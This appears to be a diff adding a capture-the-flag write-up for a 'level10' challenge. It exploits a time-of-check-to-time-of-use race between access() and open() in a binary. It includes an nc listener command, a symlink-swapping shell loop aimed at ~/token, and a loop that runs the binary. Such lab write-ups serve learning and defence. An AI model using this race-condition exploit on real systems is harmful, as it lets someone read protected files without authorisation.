@@ -1,0 +1,32 @@
+When we execute the binary, it ask for a connection on port 6969
+
+with cutter we examined the binary and saw an access function call
+
+we checked for vulnerabilities and found one, if access passed it calls open but there is a little delay.
+
+The trick is to switch with a symbolic link from a trash file where we have rights to the token file between this delay
+
+To do this, we make an infinite loop that keep switching the symbolic links between the token and the trash file in order to exploit the vulnerability
+
+First make a terminal listening on port 6969 `nc -lk 6969`
+
+Then exec the script
+```
+#!/bin/sh
+
+new=`ls -l to_read`
+old=`ls -l to_read`
+
+while [ "$new" = "$old" ]
+do
+	ln -fs useless_file symlink
+	ln -fs ~/token symlink
+	new=`ls -l to_read`
+done
+```
+
+and to finish, you can run the binary in a loop `while true; do ./level10 /tmp/level10/symlink 127.0.0.1; done`
+
+
+
+quintuple booommm
